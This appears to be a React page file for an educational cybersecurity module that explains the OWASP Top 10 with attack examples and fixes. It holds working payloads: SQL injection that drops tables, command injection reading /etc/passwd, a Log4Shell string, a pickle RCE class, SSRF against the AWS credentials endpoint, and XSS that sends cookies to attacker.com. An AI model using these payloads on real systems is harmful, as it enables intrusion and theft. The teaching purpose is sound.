import type { Metadata } from 'next'
import Link from 'next/link'
import { LearnLayout } from '@/components/content/LearnLayout'
import { Callout } from '@/components/content/Callout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'

export const metadata: Metadata = {
  title: 'Web Application Attacks — OWASP Top 10 From First Principles | Chaduvuko',
  description: 'SQL injection, XSS, SSRF, IDOR — every OWASP vulnerability explained with real attack examples and the exact code patterns that cause them.',
}

const C = '#ff4757'

const Part = ({ n, title }: { n: string; title: string }) => (
  <div style={{ marginBottom: 28 }}>
    <p style={{ fontSize: 11, color: C, fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 8px', letterSpacing: '.1em' }}>// Part {n}</p>
    <h2 style={{ fontFamily: 'var(--font-display)', fontSize: 'clamp(20px,3vw,30px)', fontWeight: 900, letterSpacing: '-1.5px', color: 'var(--text)', margin: 0 }}>{title}</h2>
  </div>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.9, margin: '0 0 18px' }}>{children}</p>
)

const H = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontSize: 17, fontWeight: 700, color: 'var(--text)', margin: '32px 0 12px' }}>{children}</h3>
)

const Hl = ({ children }: { children: React.ReactNode }) => (
  <strong style={{ color: C }}>{children}</strong>
)

const HR = () => <div style={{ borderTop: '1px solid var(--border)', margin: '48px 0' }} />

const IQ = ({ q, children }: { q: string; children: React.ReactNode }) => (
  <div style={{ marginBottom: 40 }}>
    <div style={{ background: `${C}10`, border: `1px solid ${C}25`, borderRadius: '8px 8px 0 0', padding: '14px 18px', fontSize: 14, fontWeight: 700, color: 'var(--text)' }}>Q: {q}</div>
    <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderTop: 'none', borderRadius: '0 0 8px 8px', padding: '18px', fontSize: 14, color: 'var(--text)', lineHeight: 1.9 }}>{children}</div>
  </div>
)

const Err = ({ msg, cause, fix }: { msg: string; cause: string; fix: string }) => (
  <div style={{ marginBottom: 24, border: '1px solid var(--border)', borderRadius: 10, overflow: 'hidden' }}>
    <div style={{ background: 'rgba(255,71,87,0.09)', borderBottom: '1px solid var(--border)', padding: '10px 16px', fontFamily: 'var(--font-mono)', fontSize: 12, color: '#ff4757', wordBreak: 'break-all', lineHeight: 1.6 }}>{msg}</div>
    <div style={{ padding: '14px 16px' }}>
      <p style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7, margin: '0 0 8px' }}><strong style={{ color: 'var(--text)' }}>Cause: </strong>{cause}</p>
      <p style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.7, margin: 0 }}><strong style={{ color: '#00e676' }}>Fix: </strong>{fix}</p>
    </div>
  </div>
)

const ProTip = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: `${C}08`, border: `1px solid ${C}20`, borderRadius: 10, padding: '16px 20px', margin: '24px 0' }}>
    <p style={{ fontSize: 11, fontWeight: 700, color: C, fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '.1em', margin: '0 0 8px' }}>🎯 Pro Tip</p>
    <p style={{ fontSize: 14, color: 'var(--text)', lineHeight: 1.85, margin: 0 }}>{children}</p>
  </div>
)

const Block = ({ children }: { children: React.ReactNode }) => (
  <pre style={{ fontFamily: 'var(--font-mono)', fontSize: 12, background: 'var(--bg2)', border: '1px solid var(--border)', borderRadius: 8, padding: '16px 20px', overflowX: 'auto', lineHeight: 1.75, color: 'var(--text)', margin: '0 0 20px' }}>{children}</pre>
)

export default function WebAttacksOwasp() {
  return (
    <LearnLayout
      title="Web Application Attacks — OWASP Top 10 From First Principles"
      description="SQL injection, XSS, SSRF, IDOR — every OWASP vulnerability explained with real attack examples and the exact code patterns that cause them."
      section="Cybersecurity — Module 09"
      readTime="35 min"
      updatedAt="May 2026"
    >

      {/* ── PART 01 ── */}
      <Part n="01" title="Why Web Application Security Matters Most" />

      <P>Web applications are the most attacked surface in modern computing — not because they are especially poorly written, but because they are internet-facing by design, handle sensitive data by necessity, and represent the largest and most diverse attack surface of any computing category. The OWASP (Open Web Application Security Project) Top 10 catalogues the most critical and common vulnerability classes. Every security engineer, every developer, and every penetration tester must know them.</P>

      <P>These are not theoretical vulnerabilities. SQL injection, Cross-Site Scripting, and Broken Access Control appear in real breaches every week. The 2021 LinkedIn data scrape (700 million records), the 2022 Optus breach (11.2 million Australians' data), and hundreds of smaller breaches each year trace back to one or more OWASP Top 10 vulnerabilities. Understanding them from first principles — not just knowing the names — is what separates a security engineer who can find and fix these issues from one who can only recite them.</P>

      <div style={{ background: `${C}08`, border: `1px solid ${C}25`, borderLeft: `4px solid ${C}`, borderRadius: '0 10px 10px 0', padding: '20px 24px', margin: '4px 0 28px' }}>
        <P>This module covers the OWASP Top 10 (2021 edition) from the attacker's perspective: the exact conditions that create each vulnerability, how an attacker exploits it, the real-world impact, and the specific code patterns that fix it. The goal is to build the mental model that lets you recognise these vulnerabilities in code you read and write — not just in exam questions.</P>
      </div>

      <HR />

      {/* ── PART 02 ── */}
      <Part n="02" title="A01 — Broken Access Control" />

      <P><Hl>Access control</Hl> enforces that users can only perform actions or access data that they are authorised for. Broken access control means the enforcement fails — authenticated users can access resources that belong to other users, perform administrative actions they should not, or manipulate access control mechanisms themselves.</P>

      <H>Insecure Direct Object Reference (IDOR)</H>
      <P>IDOR is the most common broken access control pattern. The application uses a user-controllable reference (ID, filename, account number) to directly access an object without verifying that the requesting user owns or is authorised to access it.</P>

      <Block>{`# Vulnerable endpoint
GET /api/invoices/1042
Authorization: Bearer [user_alice_token]

# Response: Alice's invoice — correct

GET /api/invoices/1043   ← Alice changes the ID
Authorization: Bearer [user_alice_token]

# Response: Bob's invoice — IDOR vulnerability
# Alice accessed Bob's private invoice with no authorisation check

# The fix: always verify ownership server-side
def get_invoice(invoice_id, current_user):
    invoice = Invoice.get(invoice_id)
    if invoice.owner_id != current_user.id:
        raise Forbidden("Access denied")     # ← authorisation check
    return invoice`}</Block>

      <H>Privilege Escalation via Parameter Tampering</H>
      <Block>{`# Vulnerable registration endpoint that accepts a role parameter
POST /api/register
{"username": "attacker", "password": "pass123", "role": "admin"}

# If the server sets the role from the request body without validation:
# attacker now has an admin account

# Fix: never accept role or privilege from user input
# Always derive role from server-side logic (default: user, manually elevated by admin)`}</Block>

      <H>Forced Browsing</H>
      <P>Accessing URLs or API endpoints that should be restricted but are not properly protected. An admin panel at <code style={{ fontFamily: 'var(--font-mono)', fontSize: 12, background: 'var(--bg2)', padding: '1px 5px', borderRadius: 3 }}>/admin</code> that only checks if the user is authenticated (not if they are an admin) can be accessed by any logged-in user. Vertical privilege escalation — a regular user accessing admin functionality.</P>

      <ProTip>Broken access control is consistently the #1 OWASP vulnerability by occurrence rate — it appears in 94% of tested applications in some form. It is also the most impactful: access control failures lead directly to data breaches. The fix is never a clever technical mechanism — it is consistently checking authorisation on every resource access on the server side, never trusting client-supplied authorisation indicators.</ProTip>

      <HR />

      {/* ── PART 03 ── */}
      <Part n="03" title="A02 — Cryptographic Failures (Sensitive Data Exposure)" />

      <P>Previously called "Sensitive Data Exposure," this category covers two related failures: storing or transmitting sensitive data without adequate encryption, or using weak/broken cryptographic algorithms that provide false security.</P>

      <Block>{`# Failure 1: Sensitive data transmitted over HTTP
http://bank.example.com/login  ← credentials in plaintext, visible to network observers

# Failure 2: Sensitive data stored without encryption
CREATE TABLE users (
    id INT,
    email VARCHAR(255),
    password VARCHAR(255),   ← plaintext passwords
    ssn VARCHAR(11)          ← SSN stored without encryption
);

# Failure 3: Weak password hashing
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()  # MD5 — crackable in seconds

# Failure 4: Using deprecated algorithms
cipher = DES.new(key, DES.MODE_ECB)  # DES (56-bit) — broken. ECB mode — broken.

# Correct: strong hashing for passwords, encryption for sensitive fields
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

from cryptography.fernet import Fernet  # AES-128-CBC + HMAC — for field encryption`}</Block>

      <P>Real-world impact: the 2012 LinkedIn breach exposed 6.5 million SHA-1 password hashes (unsalted). By 2016, it emerged that 117 million accounts were affected and the majority of passwords had been cracked within days using GPU-based dictionary attacks. SHA-1 without salt, cracked in bulk — a cryptographic failure with 117 million victims.</P>

      <HR />

      {/* ── PART 04 ── */}
      <Part n="04" title="A03 — Injection (SQL Injection and Beyond)" />

      <P>Injection vulnerabilities occur when untrusted user input is processed as code or a command rather than as data. SQL injection is the canonical example, but the same pattern extends to OS command injection, LDAP injection, XPath injection, and any other context where user input and execution context mix.</P>

      <H>SQL Injection — The Mechanics</H>
      <Block>{`# Vulnerable login query (Python + f-string)
query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"

# Normal input: email="alice@example.com", password="hunter2"
# SQL: SELECT * FROM users WHERE email='alice@example.com' AND password='hunter2'

# Attack: email="' OR '1'='1' --", password="anything"
# SQL: SELECT * FROM users WHERE email='' OR '1'='1' --' AND password='anything'
#                                                       ↑ rest of query commented out
# '1'='1' is always true → returns all users → attacker is logged in as first user (often admin)

# Attack: email="'; DROP TABLE users; --", password="anything"
# SQL: SELECT * FROM users WHERE email=''; DROP TABLE users; --'
# Deletes the entire users table — destructive SQLi

# Attack: email="' UNION SELECT username, password FROM admin_users --"
# Extracts admin credentials from a different table — data exfiltration SQLi`}</Block>

      <H>The Fix: Parameterised Queries</H>
      <Block>{`# WRONG — string concatenation or f-strings with user input
cursor.execute(f"SELECT * FROM users WHERE email='{email}'")  # VULNERABLE

# CORRECT — parameterised queries (prepared statements)
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))  # Python DB-API
cursor.execute("SELECT * FROM users WHERE email = ?", [email])     # SQLite
stmt = conn.prepare("SELECT * FROM users WHERE email = $1")        # PostgreSQL

# ORMs parameterise by default
User.objects.filter(email=email)    # Django ORM — safe
User.where(email: email)            # ActiveRecord — safe
db.query("SELECT...", email)        # with explicit parameters — check your ORM docs

# NEVER raw string format even with ORMs
User.objects.raw(f"SELECT * FROM users WHERE email='{email}'")  # VULNERABLE`}</Block>

      <H>OS Command Injection</H>
      <Block>{`# Vulnerable: shell=True with user input
import subprocess
result = subprocess.run(f"ping {host}", shell=True)
# Attack: host = "127.0.0.1; cat /etc/passwd"
# Runs: ping 127.0.0.1; cat /etc/passwd  → executes arbitrary OS commands

# Fix: pass arguments as a list, never use shell=True with user input
result = subprocess.run(["ping", "-c", "1", host])  # host is just a string argument, not parsed as shell`}</Block>

      <HR />

      {/* ── PART 05 ── */}
      <Part n="05" title="A04 — Insecure Design" />

      <P>Insecure design is a category that sits above specific vulnerabilities — it represents missing or ineffective security controls at the design level. You can write perfectly implemented code that is insecurely designed. Examples include: a password reset flow that reveals whether an email exists (enabling account enumeration); a payment system that trusts client-supplied pricing; an API that returns full objects when the caller only needed one field (over-fetching sensitive data).</P>

      <Block>{`# Insecure design: password reset flow reveals account existence
POST /api/reset-password {"email": "target@company.com"}

# If account exists:   {"message": "Reset email sent to target@company.com"}
# If not exists:       {"message": "No account found for that email"}
# Attacker can enumerate valid email addresses in bulk

# Secure design: same response regardless
{"message": "If an account exists with that email, you will receive a reset link."}

# Insecure design: client-supplied price
POST /api/checkout {"item_id": 42, "price": 0.01}
# Server trusts the price from the request body

# Secure design: price always retrieved server-side from the product database
# Never trust price, quantity, or discount values from the client`}</Block>

      <HR />

      {/* ── PART 06 ── */}
      <Part n="06" title="A05 — Security Misconfiguration" />

      <P>Security misconfiguration is the most broadly applicable OWASP category — it encompasses every case where a secure feature exists but is not enabled or is configured incorrectly. Default credentials, verbose error messages, open cloud storage, unnecessary features enabled, missing security headers.</P>

      <Block>{`# Common misconfigurations:

1. Default credentials
   Admin:admin, admin:password, root:root on routers, databases, applications
   Shodan can find thousands of devices with default credentials

2. Directory listing enabled
   GET /uploads/   → Lists all uploaded files including private documents
   Fix: disable directory listing in nginx/apache config

3. Cloud storage misconfiguration
   AWS S3 bucket with public-read ACL containing customer data
   Google Cloud Storage bucket without authentication
   Exposed .git directories revealing source code

4. Verbose error messages in production
   Stack traces, SQL errors, file paths revealed to users

5. Missing security headers
   No Content-Security-Policy → XSS impact amplified
   No Strict-Transport-Security → SSL stripping possible
   No X-Frame-Options → clickjacking possible

6. Unnecessary features enabled
   PHP info page at /phpinfo.php reveals server configuration
   Admin interfaces at default paths (/wp-admin, /phpmyadmin)
   Debug endpoints left enabled in production (/debug, /actuator)`}</Block>

      <HR />

      {/* ── PART 07 ── */}
      <Part n="07" title="A06 — Vulnerable and Outdated Components" />

      <P>Modern applications depend on hundreds of third-party libraries and frameworks. Each dependency is a potential vulnerability. When a critical vulnerability is discovered in a widely-used library — like Log4j's Log4Shell (CVE-2021-44228) — every application that uses that library is suddenly vulnerable.</P>

      <Block>{`# Log4Shell (CVE-2021-44228) — December 2021
# Apache Log4j 2.x library vulnerable to remote code execution
# The library evaluates JNDI lookups in log messages

# Attacker sends a request with this string in any logged field (User-Agent, username, etc.):
${'{jndi:ldap://attacker.com/a}'}

# Log4j processes the string → makes LDAP request to attacker.com
# Attacker's LDAP server responds with a Java class → RCE

# Every application using Log4j 2.0-2.14.1 (millions of applications) was vulnerable
# Exploitation began within hours of public disclosure
# CVSS score: 10.0 (maximum)

# Dependency scanning — tools to detect vulnerable libraries:
# npm audit         (JavaScript/Node.js)
# pip-audit         (Python)
# bundler-audit     (Ruby)
# OWASP Dependency-Check (Java, .NET, multi-language)
# Snyk, GitHub Dependabot, socket.dev — automated in CI/CD`}</Block>

      <HR />

      {/* ── PART 08 ── */}
      <Part n="08" title="A07 — Identification and Authentication Failures" />

      <P>Authentication failures enable attackers to assume other users' identities. This category covers weak passwords, broken session management, credential stuffing, and implementation errors in authentication flows.</P>

      <Block>{`# Common authentication failures:

1. No brute-force protection
   POST /login {"username":"admin","password":"*"}  × 1,000,000 attempts
   Fix: account lockout or rate limiting after N failures

2. Weak password policy
   Accepting "password", "12345678", "company2026"
   Fix: enforce minimum complexity AND check against Have I Been Pwned breach database

3. Credential stuffing (using breached credentials from other sites)
   65% of users reuse passwords — breach at site A gives credentials for site B
   Fix: MFA defeats credential stuffing

4. Weak session management
   session_id = str(random.randint(0, 999999))  # predictable 6-digit token
   Fix: use cryptographically random 128-bit session tokens (os.urandom(16).hex())

5. Session not invalidated on logout
   Old session token still works after user clicks "Logout"
   Fix: server-side session invalidation — delete session record on logout

6. Password reset with weak token
   Reset token is MD5(email + timestamp) — predictable
   Fix: secrets.token_urlsafe(32) — cryptographically random token
        Store hash of token, compare on use, expire after 1 hour, single-use`}</Block>

      <HR />

      {/* ── PART 09 ── */}
      <Part n="09" title="A08 — Software and Data Integrity Failures" />

      <P>This category covers scenarios where software, data, or dependencies are used without verifying their integrity — trusting content that could have been modified by an attacker.</P>

      <H>CI/CD Pipeline Compromise</H>
      <P>A compromised build pipeline can inject malicious code into legitimate software without changing the source code. The SolarWinds attack is the defining example: attackers modified the build process for SolarWinds Orion to include the SUNBURST backdoor in the compiled binary. The source code repository was clean; the build output was malicious.</P>

      <H>Insecure Deserialization</H>
      <Block>{`# Deserialization vulnerability — Python pickle example
import pickle
import base64

# Server deserializes user-supplied data without validation
data = request.cookies.get('user_session')
session = pickle.loads(base64.b64decode(data))  # DANGEROUS

# Attacker crafts a malicious pickle payload that executes code on load:
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

malicious = base64.b64encode(pickle.dumps(Exploit())).decode()
# Attacker sets cookie to malicious value → server deserializes → RCE

# Fix: never deserialize user-supplied data with pickle/Java serialization
# Use JSON (no code execution risk) with explicit schema validation`}</Block>

      <H>Unsigned Package Updates</H>
      <P>Applications that pull updates from URLs without signature verification can be hijacked: a compromised CDN, a DNS hijack, or a man-in-the-middle attack can replace a legitimate update with malicious code. Package signing (npm provenance, Python package hashes, GPG-signed packages) and HTTPS for all package sources are the mitigations.</P>

      <HR />

      {/* ── PART 10 ── */}
      <Part n="10" title="A09 — Security Logging and Monitoring Failures" />

      <P>This category captures an often-overlooked reality: attacks that are not detected and not investigated cause the same damage as attacks that are. The average dwell time — the time between a breach and its detection — was 204 days globally in 2022. During that time, attackers may have exfiltrated terabytes of data. The absence of logging and monitoring is what enables that dwell time.</P>

      <Block>{`# What must be logged:
- Authentication events (success and failure, with IP and timestamp)
- Authorization failures (403 Forbidden responses — access denied attempts)
- Input validation failures (WAF hits, error responses to unusual input)
- API authentication failures (invalid tokens, expired sessions)
- Privilege escalation events (account role changes, sudo usage)
- Data access of sensitive resources (access to PII, financial data)
- Application errors (500 responses, exception stack traces — server-side only)

# What a log entry must contain:
{
  "timestamp": "2026-05-09T14:32:17.234Z",  # Always UTC
  "event_type": "authentication_failure",
  "user_id": "usr_12345",                    # Or null for anonymous
  "ip_address": "185.234.1.2",
  "user_agent": "Mozilla/5.0...",
  "resource": "/api/admin/users",
  "request_id": "req_abc123"                 # Correlate across services
}

# What NOT to log (sensitive data in logs is a breach):
- Passwords or password hashes
- Full credit card numbers or CVVs
- Session tokens or API keys
- Full SSNs or medical record numbers`}</Block>

      <HR />

      {/* ── PART 11 ── */}
      <Part n="11" title="A10 — Server-Side Request Forgery (SSRF)" />

      <P><Hl>SSRF</Hl> occurs when a web application fetches a remote resource on behalf of the user, and an attacker can control or influence the URL that is fetched. This allows attackers to use the server as a proxy to reach internal resources — cloud metadata services, internal APIs, databases, and services that should not be reachable from the internet.</P>

      <Block>{`# Vulnerable endpoint: fetch URL provided by user
@app.route('/preview')
def preview():
    url = request.args.get('url')
    response = requests.get(url)      # Server fetches attacker-controlled URL
    return response.content

# Attack 1: Access cloud instance metadata
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# AWS metadata endpoint returns IAM credentials for the EC2 instance role
# Attacker now has AWS credentials with whatever permissions the instance has

# Attack 2: Port scan the internal network
GET /preview?url=http://192.168.1.10:6379/
# If Redis is running and unauthenticated, returns Redis banner → port confirmed open

# Attack 3: Access internal APIs
GET /preview?url=http://internal-api.company.internal/admin/users

# Fix: allowlist approach — only permit specific trusted domains
ALLOWED_DOMAINS = {'cdn.company.com', 'api.trusted-vendor.com'}
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_DOMAINS:
    raise ValueError("URL not permitted")

# Also block private IP ranges before making any request
import ipaddress
ip = socket.gethostbyname(parsed.hostname)
if ipaddress.ip_address(ip).is_private:
    raise ValueError("Private IP not permitted")`}</Block>

      <P>SSRF is particularly dangerous in cloud environments because cloud providers expose metadata services at well-known internal IPs. The 2019 Capital One breach — which exposed 100 million customers' data — involved SSRF against the AWS metadata endpoint, obtaining IAM credentials that then accessed the S3 buckets containing customer data.</P>

      <HR />

      {/* ── PART 12 ── */}
      <Part n="12" title="Cross-Site Scripting (XSS) — JavaScript Injection" />

      <P>XSS is technically an injection vulnerability (injection of JavaScript into web pages) and was part of earlier OWASP Top 10 lists. It remains one of the most common and impactful web vulnerabilities despite not being a standalone category in the 2021 edition. Three types exist, with different mechanics and impact:</P>

      <H>Reflected XSS</H>
      <Block>{`# The server reflects user input directly into the HTML response without encoding
GET /search?q=<script>alert(document.cookie)</script>

# Vulnerable response:
<html>
  <p>Search results for: <script>alert(document.cookie)</script></p>
</html>
# The script executes in the victim's browser — steals cookies, redirects, runs actions

# Attack: attacker sends a link to victim
https://legitimate-site.com/search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
# When victim clicks the link: their cookies are sent to attacker.com`}</Block>

      <H>Stored XSS (Persistent XSS)</H>
      <Block>{`# Attacker submits a comment that gets stored in the database:
POST /api/comments {"text": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}

# Every user who views the page with this comment executes the script
# This is more dangerous than Reflected XSS — no user interaction with a malicious link needed
# The payload is served from the legitimate site to every visitor

# Real-world example: Samy worm (2005) — MySpace XSS that spread to 1M profiles in 20 hours`}</Block>

      <H>DOM-based XSS</H>
      <Block>{`# JavaScript reads from a dangerous source and writes to a dangerous sink without sanitisation
// Vulnerable: reads location.hash and writes to innerHTML
const fragment = location.hash.substring(1);  // dangerous source
document.getElementById('content').innerHTML = fragment;  // dangerous sink

// Attack: https://site.com/page#<img src=x onerror=alert(document.cookie)>
// The hash value is read by JS and written to DOM — executes attacker script

// Fix: use textContent instead of innerHTML (no HTML parsing = no XSS)
document.getElementById('content').textContent = fragment;`}</Block>

      <H>XSS Prevention</H>
      <Block>{`# 1. Output encoding — encode all dynamic content before inserting into HTML
from markupsafe import escape
safe_output = escape(user_input)  # < becomes &lt;, > becomes &gt; etc.

# 2. Content Security Policy — restricts which scripts can execute
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com

# 3. Modern frameworks encode by default
# React: {variable}  → encoded by default (safe)
# Angular: {{variable}} → encoded by default (safe)
# Dangerous: dangerouslySetInnerHTML in React, bypassSecurityTrust* in Angular

# 4. HttpOnly cookies — JavaScript cannot read them even if XSS fires
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict`}</Block>

      <HR />

      {/* ── PART 13 ── */}
      <Part n="13" title="What This Looks Like at Work — Finding IDOR in a Code Review" />

      <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 12, padding: '24px 28px', marginBottom: 24 }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: C, background: `${C}15`, border: `1px solid ${C}30`, borderRadius: 6, padding: '4px 10px', fontFamily: 'var(--font-mono)', display: 'inline-block', marginBottom: 20, letterSpacing: '.1em', textTransform: 'uppercase' }}>
          Scenario — AppSec engineer reviewing a new API endpoint
        </div>

        {[
          {
            time: '10:00',
            label: 'New API endpoint submitted for review',
            body: 'A developer submits a pull request for a new endpoint: GET /api/documents/{id}/download. The PR description says this allows users to download documents they have shared with them. The code is syntactically clean and passes all unit tests.',
          },
          {
            time: '10:10',
            label: 'Code review reveals the authorisation check',
            body: 'The endpoint implementation: document = Document.query.get(id) — retrieves the document by ID. The next line: return send_file(document.path) — sends the file. There is no check that the requesting user is authorised to access this document. The authentication middleware verifies the user is logged in, but there is no authorisation check on whether this user should have access to document ID X.',
          },
          {
            time: '10:15',
            label: 'Confirming the IDOR',
            body: 'Looking at the Document model: documents have an owner_id (the user who uploaded) and a shared_with array (users it was shared with). Neither field is checked in the endpoint. Any authenticated user can download any document in the system by iterating through IDs: GET /api/documents/1/download, /api/documents/2/download... This is a textbook IDOR affecting every document in the application.',
          },
          {
            time: '10:25',
            label: 'Writing up the finding',
            body: 'The AppSec engineer writes a detailed finding: vulnerability type (IDOR — Broken Access Control), affected endpoint, proof of concept (increment the ID to access another user\'s document), impact (all documents accessible to any authenticated user), CVSS score (8.1 High — network attack, low complexity, requires authentication), and the specific code fix required.',
          },
          {
            time: '10:30',
            label: 'The fix',
            body: 'The correct code: after retrieving the document, check if the current user is the owner or in the shared_with list. If neither: return 403 Forbidden. The fix is four lines. The unit test suite is also updated to include an authorisation test: user B cannot download user A\'s document. The PR is approved only after the fix and test are added. This review prevented a data breach that would have exposed every document uploaded to the platform.',
          },
        ].map((block) => (
          <div key={block.time} style={{ display: 'flex', gap: 20, marginBottom: 20 }}>
            <div style={{ flexShrink: 0, width: 60, textAlign: 'right' }}>
              <div style={{ fontSize: 12, fontWeight: 700, color: C, fontFamily: 'var(--font-mono)' }}>{block.time}</div>
            </div>
            <div style={{ flex: 1, borderLeft: `2px solid ${C}30`, paddingLeft: 18, paddingBottom: 4 }}>
              <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)', marginBottom: 4 }}>{block.label}</div>
              <div style={{ fontSize: 13, color: 'var(--muted)', lineHeight: 1.75 }}>{block.body}</div>
            </div>
          </div>
        ))}

        <Callout type="tip">
          IDOR vulnerabilities are easiest to find in code review because the pattern is simple to spot: a user-controlled ID is used to retrieve an object, and the subsequent authorisation check is missing. In penetration testing, IDOR is found by intercepting API requests in Burp Suite and systematically changing ID parameters. It is consistently one of the most common and highest-impact findings in web application security assessments.
        </Callout>
      </div>

      <HR />

      {/* ── PART 14 ── */}
      <Part n="14" title="Interview Prep — 5 Questions With Complete Answers" />

      <IQ q="Explain SQL injection from first principles. Why does it work and how do you prevent it?">
        SQL injection works because the application constructs SQL queries by concatenating user-supplied input directly into the query string, rather than treating user input as data. When the database receives the concatenated string, it cannot distinguish between the developer's intended SQL structure and the attacker's injected content — it executes all of it as SQL.
        {'\n\n'}
        The mechanics: suppose a login query is built as: SELECT * FROM users WHERE email='{'{email}'}' AND password='{'{password}'}'. If the email input is "' OR '1'='1' --", the resulting query becomes: SELECT * FROM users WHERE email='' OR '1'='1' --' AND password='whatever'. The -- comments out the rest of the query, and '1'='1' is always true — the WHERE clause returns all users, and the attacker is authenticated as the first user returned (often an admin account).
        {'\n\n'}
        SQL injection can do more than authentication bypass. UNION-based injection appends a second SELECT to extract data from other tables: ' UNION SELECT username, password FROM admin_users --. Stacked queries in some databases allow arbitrary SQL: '; DROP TABLE users; --. Blind SQL injection extracts data one bit at a time through true/false responses even when no output is returned.
        {'\n\n'}
        Prevention: parameterised queries (also called prepared statements). Rather than concatenating input into the SQL string, the query template is sent to the database separately from the data values. The database driver handles escaping and type conversion. The database engine receives the query structure and the data values as separate entities — user input is always treated as data, never as SQL syntax. No user input can change the structure of the query. Every major database driver and every ORM supports parameterised queries. String concatenation for SQL queries is never acceptable.
      </IQ>

      <IQ q="What is XSS and what is the difference between reflected, stored, and DOM-based XSS?">
        Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a web page, and that script executes in other users' browsers. The impact: the injected script runs with the full permissions of the legitimate page — it can read cookies (including session tokens), make authenticated API requests, modify page content, log keystrokes, redirect users, and access any data the page has access to.
        {'\n\n'}
        Reflected XSS: the injected script is in the HTTP request (typically a URL parameter) and is reflected directly into the HTML response by the server without encoding. The attacker sends a specially crafted URL to the victim; when the victim clicks it, the script executes in their browser. The attacker must deliver the URL to the victim — typically via phishing.
        {'\n\n'}
        Stored XSS (Persistent XSS): the injected script is stored in the application's database (via a comment, profile field, or message) and served to every user who views the page containing it. No attacker-delivered URL is required — the payload is served from the legitimate site to every visitor. Stored XSS affects a broader audience and persists until the payload is removed. The Samy worm on MySpace (2005) used stored XSS to spread to one million profiles in 20 hours.
        {'\n\n'}
        DOM-based XSS: the vulnerability is entirely client-side. The server sends a clean HTML response, but JavaScript on the page reads data from a dangerous source (location.hash, document.referrer, URL parameters) and writes it to the DOM via a dangerous sink (innerHTML, eval, document.write) without sanitisation. The server never sees the malicious input. Traditional server-side output encoding does not help — the client-side JavaScript must handle this correctly by using textContent instead of innerHTML and avoiding eval.
        {'\n\n'}
        Prevention: output encoding (HTML-encode dynamic content before insertion into HTML context — safe characters only), Content Security Policy (restricts which scripts can execute — a properly configured CSP can prevent XSS execution even if injection occurs), and using safe DOM manipulation methods (textContent not innerHTML). Modern frameworks like React and Angular HTML-encode by default when using their standard template syntax.
      </IQ>

      <IQ q="What is IDOR and why is it so common despite being conceptually simple?">
        Insecure Direct Object Reference (IDOR) is a broken access control vulnerability where an application uses a user-controllable identifier (an ID, filename, account number) to directly access an object without verifying that the requesting user is authorised to access that specific object.
        {'\n\n'}
        The simplest example: an invoice download endpoint at /api/invoices/{'{id}'}. A legitimate user can access /api/invoices/1042 (their invoice). If the application authenticates the user (confirms they are logged in) but does not authorise access to the specific resource (confirms that this user owns invoice 1042), then the user can change the ID to 1043 and access another user's invoice.
        {'\n\n'}
        IDOR is common for several reasons. First, authentication and authorisation are conceptually separate concerns, and developers often implement authentication (login system) thoroughly while treating authorisation checks as an afterthought for each individual endpoint. Second, in microservice architectures, a service that validates authentication at the gateway level may receive requests with the assumption that authorisation was already checked — when it was not. Third, there is no automatic enforcement: unlike SQL injection (where ORMs protect by default) or XSS (where frameworks encode by default), authorisation must be explicitly coded for every resource access. A missing check is invisible until someone exploits it.
        {'\n\n'}
        Why it matters: IDOR is consistently the #1 most commonly found vulnerability in bug bounty programs. It is also #1 in real breach impact — IDOR directly exposes data belonging to other users, which is the textbook definition of a data breach. The fix is always the same: on the server side, verify that the authenticated user has authorisation to access the specific resource they requested before returning it.
      </IQ>

      <IQ q="Explain SSRF. What is the attacker's goal and why is it particularly dangerous in cloud environments?">
        Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can cause a server to make HTTP requests to an arbitrary URL — either one provided directly by the attacker or one they can influence. The server's outbound request appears to originate from the server's trusted network position.
        {'\n\n'}
        The attacker's primary goals: first, accessing internal services that are not reachable from the internet — internal admin panels, internal APIs, databases that listen on localhost, microservices behind a firewall. The server is already trusted on the internal network; when the attacker forces it to make requests, those requests come from a trusted internal source. Second, accessing cloud infrastructure metadata.
        {'\n\n'}
        Why SSRF is particularly dangerous in cloud environments: AWS, GCP, and Azure all expose an instance metadata service (IMDS) at a well-known internal IP address (AWS: 169.254.169.254; GCP/Azure: similar). The metadata service provides the instance's IAM credentials, network configuration, and user data. A server running in AWS that is vulnerable to SSRF can be forced to request http://169.254.169.254/latest/meta-data/iam/security-credentials/, which returns the IAM role credentials attached to the EC2 instance. Those credentials have whatever permissions the instance role has — which in many cases includes broad S3 access.
        {'\n\n'}
        The 2019 Capital One breach: the attacker used an SSRF vulnerability in a web application firewall running on EC2 to access the AWS metadata endpoint and retrieve the IAM role credentials. Those credentials had read access to over 700 S3 buckets. 100 million customers' data was exfiltrated.
        {'\n\n'}
        Prevention: allowlist-based URL validation (only permit specific trusted domains, not a blocklist of internal ranges — blocklists can be bypassed with DNS rebinding), block private IP ranges at the network layer, use IMDSv2 (which requires a session token that must be fetched with a PUT request — SSRF via GET cannot obtain IMDSv2 credentials), and design APIs that do not need to fetch user-supplied URLs.
      </IQ>

      <IQ q="What is the difference between authentication and session management failures, and why does session token security matter?">
